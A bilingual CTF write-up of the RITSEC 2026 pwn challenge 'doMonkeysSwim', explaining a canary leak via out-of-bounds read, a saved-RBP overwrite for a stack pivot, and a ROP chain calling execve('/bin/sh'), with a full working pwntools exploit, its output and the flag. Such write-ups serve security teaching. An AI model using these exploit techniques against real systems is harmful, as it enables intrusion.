# RITSEC CTF 2026 - doMonkeysSwim
## Category: PWN

---

# [EN] English Version

## Binary Analysis

```
$ file doMonkeysSwim
ELF 64-bit LSB executable, x86-64, statically linked, not stripped
```

The binary is **statically linked** and **not stripped**, making reverse engineering easier. Importantly: **no PIE**, so all addresses in the binary are fixed.

### Main Functions

The program is a menu-based game with 6 options:

```
1. Monkey new      -> malloc()
2. Monkey kill     -> free()
3. Monkey see      -> monkey_see()
4. Monkey do       -> monkey_do()
5. Monkey swaperoo -> monkey_swaperoo()
6. Exit :3         -> game epilogue (leave; ret)
```

### Function `game()` (0x401e4a)

Main loop: prints menu, reads choice, calls the corresponding function via jump table. When choosing **option 6**, jumps to the `game` function's epilogue:

```asm
game+0xa7:  mov    -0x8(%rbp), %rax    ; read canary from rbp-0x8
            sub    %fs:0x28, %rax      ; check canary
            je     .ok
            call   __stack_chk_fail
.ok:        leave                       ; mov rsp, rbp; pop rbp
            ret                         ; pop rip -> ROP!
```

### Function `monkey_see()` (0x401bbc) - Bug: Out-of-Bounds Read

```c
// Pseudocode
int index;
long array[3];  // rbp-0x20
scanf("%d", &index);
printf("That monkey holds this: 0x%016lx", *(long*)(rbp - 0x20 + index * 8));
```

**No bounds checking** on `index`. With `index = 3`, we read `rbp - 0x20 + 24 = rbp - 0x8`, which is the **stack canary**.

### Function `monkey_do()` (0x401c98) - Bug: Buffer Overflow (overwrite saved RBP)

```c
// Stack layout:
// rbp-0x20: buffer (24 bytes)
// rbp-0x08: canary (8 bytes)
// rbp+0x00: saved rbp (8 bytes)  <-- target
// rbp+0x08: return address

char buf[24];  // rbp-0x20
fgets(buf, 0x28, stdin);  // reads 39 bytes + null terminator = 40 bytes
```

`fgets` reads **39 bytes** (0x28 - 1), enough to overwrite:
- 24 bytes buffer
- 8 bytes canary
- **7 bytes of saved RBP** (byte 8 = `\x00` from fgets null terminator)

We **cannot overwrite the return address**, but we can overwrite **saved RBP** => enabling a **Stack Pivot**.

### Function `monkey_swaperoo()` (0x401cf2) - Write ROP chain to fixed memory

```c
char buf[0x69];           // rbp-0x80
memset(buf, 0, 0x69);
fgets(buf, 0x69, stdin);  // reads 104 bytes
// Copy buf -> global buffer "bed" at 0x4cca60
memcpy(bed, buf, 0x69);   // (actually a series of mov instructions)
```

Data is copied into the **global variable `bed`** at a **fixed address `0x4cca60`** - an ideal location for a ROP chain.

### ROP Gadgets

Right after `main()`, the compiler left perfect gadgets:

```asm
0x401f43: pop rdi; ret
0x401f45: pop rsi; ret
0x401f47: pop rdx; ret
0x401f49: pop rax; ret
0x401f26: syscall          ; (inside main)
```

These are sufficient to call `execve("/bin/sh", NULL, NULL)` via syscall.

## Attack Strategy: Stack Pivot + ROP

### Overview

```
1. Leak canary         (monkey_see, index=3)
2. Write ROP chain     (monkey_swaperoo -> bed @ 0x4cca60)
3. Overwrite saved RBP (monkey_do -> pivot to bed)
4. Trigger leave;ret   (Exit -> game epilogue -> shell!)
```

### Stack Pivot Details

When we overwrite `monkey_do`'s saved RBP with `fake_rbp = bed + 0x10 = 0x4cca70`:

1. `monkey_do` executes `leave; ret`:
   - `rbp = 0x4cca70` (fake value)
   - Returns to `game()` normally

2. `game()` continues running with `rbp = 0x4cca70`:
   - Writes choice at `rbp - 0xc = 0x4cca64` (bed[4:8]) - no impact
   - Reads canary at `rbp - 0x8 = 0x4cca68` (bed[8:16]) - we placed the correct canary here

3. When choosing **Exit** (option 6), `game()` executes its epilogue:
   ```
   leave:  rsp = rbp = 0x4cca70
           pop rbp  <- reads from bed[16:24] (junk)
           rsp = 0x4cca78
   ret:    rip = bed[24:32] = pop_rdi gadget
           => ROP CHAIN BEGINS!
   ```

### Layout of `bed` (104 bytes)

```
Offset  | Content               | Purpose
--------|----------------------|----------------------------------
[0:8]   | "AAAAAAAA"           | Padding (bed[4:8] overwritten by choice)
[8:16]  | canary               | Game checks canary at rbp-0x8
[16:24] | 0xdeadbeef           | Junk RBP (pop rbp in leave)
[24:32] | 0x401f43             | pop rdi; ret
[32:40] | 0x4ccac0             | &"/bin/sh" (= bed + 96)
[40:48] | 0x401f45             | pop rsi; ret
[48:56] | 0x0000000000000000   | NULL (argv)
[56:64] | 0x401f47             | pop rdx; ret
[64:72] | 0x0000000000000000   | NULL (envp)
[72:80] | 0x401f49             | pop rax; ret
[80:88] | 0x000000000000003b   | syscall number 59 (execve)
[88:96] | 0x401f26             | syscall
[96:104]| "/bin/sh\0"          | Argument string for execve
```

### ROP Execution Flow

```
pop rdi  -> rdi = &"/bin/sh"
pop rsi  -> rsi = 0 (NULL)
pop rdx  -> rdx = 0 (NULL)
pop rax  -> rax = 0x3b (execve)
syscall  -> execve("/bin/sh", NULL, NULL)
           => SHELL!
```

## Exploit

```python
from pwn import *
import sys, time, os

if os.name == 'nt':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'dms.ctf.ritsec.club'
PORT = 1400

bed_addr     = 0x4cca60
pop_rdi      = 0x401f43
pop_rsi      = 0x401f45
pop_rdx      = 0x401f47
pop_rax      = 0x401f49
syscall_addr = 0x401f26
fake_rbp     = bed_addr + 0x10   # 0x4cca70
binsh_addr   = bed_addr + 96     # 0x4ccac0

def exploit():
    r = remote(HOST, PORT)

    # === Step 1: Leak canary via monkey_see (option 3, index 3) ===
    # monkey_see does NOT flush stdout before scanf -> send index immediately
    r.sendlineafter(b'>> ', b'3')
    r.sendline(b'3')
    r.recvuntil(b'holds this: 0x')
    canary = int(r.recvline().strip(), 16)
    log.success(f'Canary: {hex(canary)}')

    # === Step 2: Write ROP chain to bed via monkey_swaperoo (option 5) ===
    rop  = b'A' * 8           # padding
    rop += p64(canary)         # canary for game
    rop += p64(0xdeadbeef)     # junk rbp
    rop += p64(pop_rdi)        # ROP starts
    rop += p64(binsh_addr)
    rop += p64(pop_rsi)
    rop += p64(0)
    rop += p64(pop_rdx)
    rop += p64(0)
    rop += p64(pop_rax)
    rop += p64(0x3b)
    rop += p64(syscall_addr)
    rop += b'/bin/sh\x00'

    r.sendlineafter(b'>> ', b'5')
    r.recvuntil(b'this:')
    r.sendline(rop)
    r.recvuntil(b'this:')
    r.sendline(b'AAAA')

    # === Step 3: Overwrite saved RBP via monkey_do (option 4) ===
    # 24 bytes padding + 8 bytes canary + 7 bytes fake_rbp (byte 8 = \x00 from fgets)
    overflow  = b'B' * 24
    overflow += p64(canary)
    overflow += p64(fake_rbp)[:7]

    r.sendlineafter(b'>> ', b'4')
    r.sendline(overflow)

    # === Step 4: Exit -> leave;ret -> ROP -> execve -> SHELL ===
    r.sendlineafter(b'>> ', b'6')
    log.success('Shell!')

    r.sendline(b'cat flag* /flag*')
    time.sleep(1)
    print(r.recv(4096, timeout=3).decode(errors='replace'))
    r.interactive()

if __name__ == '__main__':
    exploit()
```

## Result

```
[+] Opening connection to dms.ctf.ritsec.club on port 1400: Done
[+] Canary: 0xf90f7a2d1aa97900
[+] Shell!
uid=1000760000(1000760000) gid=0(root) groups=0(root),1000760000
RS{wh3r3_h4s_4ll_th3_rum_g0n3_mr_m0nk3y_m4n?}
```

## Flag

```
RS{wh3r3_h4s_4ll_th3_rum_g0n3_mr_m0nk3y_m4n?}
```

---

# [VI] Phiên bản tiếng Việt

## Phân tích binary

```
$ file doMonkeysSwim
ELF 64-bit LSB executable, x86-64, statically linked, not stripped
```

Binary được **static link** và **không strip symbol**, giúp việc reverse dễ dàng hơn. Quan trọng: **không có PIE** nên tất cả địa chỉ trong binary là cố định.

### Các hàm chính

Chương trình là một menu game với 6 lựa chọn:

```
1. Monkey new      -> malloc()
2. Monkey kill     -> free()
3. Monkey see      -> monkey_see()
4. Monkey do       -> monkey_do()
5. Monkey swaperoo -> monkey_swaperoo()
6. Exit :3         -> game epilogue (leave; ret)
```

### Hàm `game()` (0x401e4a)

Vòng lặp chính: in menu, đọc lựa chọn, gọi hàm tương ứng qua jump table. Khi chọn **option 6**, nhảy tới epilogue của hàm `game`:

```asm
game+0xa7:  mov    -0x8(%rbp), %rax    ; đọc canary từ rbp-0x8
            sub    %fs:0x28, %rax      ; kiểm tra canary
            je     .ok
            call   __stack_chk_fail
.ok:        leave                       ; mov rsp, rbp; pop rbp
            ret                         ; pop rip -> ROP!
```

### Hàm `monkey_see()` (0x401bbc) - Lỗi: Out-of-Bounds Read

```c
// Pseudocode
int index;
long array[3];  // rbp-0x20
scanf("%d", &index);
printf("That monkey holds this: 0x%016lx", *(long*)(rbp - 0x20 + index * 8));
```

**Không có kiểm tra giới hạn** cho `index`. Với `index = 3`, ta đọc được `rbp - 0x20 + 24 = rbp - 0x8`, chính là **stack canary**.

### Hàm `monkey_do()` (0x401c98) - Lỗi: Buffer Overflow (ghi đè saved RBP)

```c
// Stack layout:
// rbp-0x20: buffer (24 bytes)
// rbp-0x08: canary (8 bytes)
// rbp+0x00: saved rbp (8 bytes)  <-- target
// rbp+0x08: return address

char buf[24];  // rbp-0x20
fgets(buf, 0x28, stdin);  // đọc 39 bytes + null terminator = 40 bytes
```

`fgets` đọc **39 bytes** (0x28 - 1), đủ để ghi đè:
- 24 bytes buffer
- 8 bytes canary
- **7 bytes của saved RBP** (byte thứ 8 = `\x00` từ null terminator của fgets)

Ta **không ghi đè được return address**, nhưng ghi đè được **saved RBP** => có thể thực hiện **Stack Pivot**.

### Hàm `monkey_swaperoo()` (0x401cf2) - Ghi ROP chain vào vùng nhớ cố định

```c
char buf[0x69];           // rbp-0x80
memset(buf, 0, 0x69);
fgets(buf, 0x69, stdin);  // đọc 104 bytes
// Copy buf -> global buffer "bed" tại 0x4cca60
memcpy(bed, buf, 0x69);   // (thực tế là chuỗi mov instructions)
```

Dữ liệu được copy vào **biến toàn cục `bed`** tại địa chỉ **cố định `0x4cca60`** - nơi lý tưởng để đặt ROP chain.

### ROP Gadgets

Ngay sau hàm `main()`, compiler để lại các gadget hoàn hảo:

```asm
0x401f43: pop rdi; ret
0x401f45: pop rsi; ret
0x401f47: pop rdx; ret
0x401f49: pop rax; ret
0x401f26: syscall          ; (trong hàm main)
```

Đây là đủ để gọi `execve("/bin/sh", NULL, NULL)` qua syscall.

## Chiến lược tấn công: Stack Pivot + ROP

### Tổng quan

```
1. Leak canary         (monkey_see, index=3)
2. Ghi ROP chain       (monkey_swaperoo -> bed @ 0x4cca60)
3. Ghi đè saved RBP    (monkey_do -> pivot tới bed)
4. Trigger leave;ret   (Exit -> game epilogue -> shell!)
```

### Chi tiết Stack Pivot

Khi ta ghi đè saved RBP của `monkey_do` với giá trị `fake_rbp = bed + 0x10 = 0x4cca70`:

1. `monkey_do` thực hiện `leave; ret`:
   - `rbp = 0x4cca70` (giá trị giả)
   - Quay về `game()` bình thường

2. `game()` tiếp tục chạy với `rbp = 0x4cca70`:
   - Ghi choice tại `rbp - 0xc = 0x4cca64` (bed[4:8]) - không ảnh hưởng
   - Đọc canary tại `rbp - 0x8 = 0x4cca68` (bed[8:16]) - ta đã đặt canary đúng ở đây

3. Khi chọn **Exit** (option 6), `game()` thực hiện epilogue:
   ```
   leave:  rsp = rbp = 0x4cca70
           pop rbp  <- đọc từ bed[16:24] (junk)
           rsp = 0x4cca78
   ret:    rip = bed[24:32] = pop_rdi gadget
           => BẮT ĐẦU ROP CHAIN!
   ```

### Bố cục của `bed` (104 bytes)

```
Offset  | Nội dung              | Mục đích
--------|----------------------|----------------------------------
[0:8]   | "AAAAAAAA"           | Padding (bed[4:8] bị ghi đè bởi choice)
[8:16]  | canary               | Game kiểm tra canary tại rbp-0x8
[16:24] | 0xdeadbeef           | Junk RBP (pop rbp trong leave)
[24:32] | 0x401f43             | pop rdi; ret
[32:40] | 0x4ccac0             | &"/bin/sh" (= bed + 96)
[40:48] | 0x401f45             | pop rsi; ret
[48:56] | 0x0000000000000000   | NULL (argv)
[56:64] | 0x401f47             | pop rdx; ret
[64:72] | 0x0000000000000000   | NULL (envp)
[72:80] | 0x401f49             | pop rax; ret
[80:88] | 0x000000000000003b   | syscall number 59 (execve)
[88:96] | 0x401f26             | syscall
[96:104]| "/bin/sh\0"          | Chuỗi argument cho execve
```

### Luồng thực thi ROP

```
pop rdi  -> rdi = &"/bin/sh"
pop rsi  -> rsi = 0 (NULL)
pop rdx  -> rdx = 0 (NULL)
pop rax  -> rax = 0x3b (execve)
syscall  -> execve("/bin/sh", NULL, NULL)
           => SHELL!
```

## Exploit

```python
from pwn import *
import sys, time, os

if os.name == 'nt':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'dms.ctf.ritsec.club'
PORT = 1400

bed_addr     = 0x4cca60
pop_rdi      = 0x401f43
pop_rsi      = 0x401f45
pop_rdx      = 0x401f47
pop_rax      = 0x401f49
syscall_addr = 0x401f26
fake_rbp     = bed_addr + 0x10   # 0x4cca70
binsh_addr   = bed_addr + 96     # 0x4ccac0

def exploit():
    r = remote(HOST, PORT)

    # === Bước 1: Leak canary qua monkey_see (option 3, index 3) ===
    # monkey_see KHÔNG flush stdout trước scanf -> gửi index ngay lập tức
    r.sendlineafter(b'>> ', b'3')
    r.sendline(b'3')
    r.recvuntil(b'holds this: 0x')
    canary = int(r.recvline().strip(), 16)
    log.success(f'Canary: {hex(canary)}')

    # === Bước 2: Ghi ROP chain vào bed qua monkey_swaperoo (option 5) ===
    rop  = b'A' * 8           # padding
    rop += p64(canary)         # canary cho game
    rop += p64(0xdeadbeef)     # junk rbp
    rop += p64(pop_rdi)        # ROP bắt đầu
    rop += p64(binsh_addr)
    rop += p64(pop_rsi)
    rop += p64(0)
    rop += p64(pop_rdx)
    rop += p64(0)
    rop += p64(pop_rax)
    rop += p64(0x3b)
    rop += p64(syscall_addr)
    rop += b'/bin/sh\x00'

    r.sendlineafter(b'>> ', b'5')
    r.recvuntil(b'this:')
    r.sendline(rop)
    r.recvuntil(b'this:')
    r.sendline(b'AAAA')

    # === Bước 3: Ghi đè saved RBP qua monkey_do (option 4) ===
    # 24 bytes padding + 8 bytes canary + 7 bytes fake_rbp (byte 8 = \x00 từ fgets)
    overflow  = b'B' * 24
    overflow += p64(canary)
    overflow += p64(fake_rbp)[:7]

    r.sendlineafter(b'>> ', b'4')
    r.sendline(overflow)

    # === Bước 4: Exit -> leave;ret -> ROP -> execve -> SHELL ===
    r.sendlineafter(b'>> ', b'6')
    log.success('Shell!')

    r.sendline(b'cat flag* /flag*')
    time.sleep(1)
    print(r.recv(4096, timeout=3).decode(errors='replace'))
    r.interactive()

if __name__ == '__main__':
    exploit()
```

## Kết quả

```
[+] Opening connection to dms.ctf.ritsec.club on port 1400: Done
[+] Canary: 0xf90f7a2d1aa97900
[+] Shell!
uid=1000760000(1000760000) gid=0(root) groups=0(root),1000760000
RS{wh3r3_h4s_4ll_th3_rum_g0n3_mr_m0nk3y_m4n?}
```

## Flag

```
RS{wh3r3_h4s_4ll_th3_rum_g0n3_mr_m0nk3y_m4n?}
```
